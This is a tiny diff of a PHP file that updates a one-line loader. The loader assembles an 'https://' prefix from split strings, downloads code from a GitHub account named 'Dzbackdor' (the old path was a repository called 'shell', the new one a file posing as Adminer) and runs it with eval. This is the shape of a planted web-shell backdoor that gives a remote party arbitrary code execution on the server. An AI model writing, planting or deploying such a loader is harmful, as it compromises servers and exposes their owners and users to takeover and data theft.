@@ -1,4 +1,5 @@
 <?php
 $awo = 'htt'.'ps://';
-eval("?>".file_get_contents($awo.'raw.githubusercontent.com/Dzbackdor/shell/master/adminer-4.8.1.php'));
+eval("?>".file_get_contents($awo.'raw.githubusercontent.com/Dzbackdor/min/refs/heads/main/adminer-5.4.1.txt'));
+
 ?>
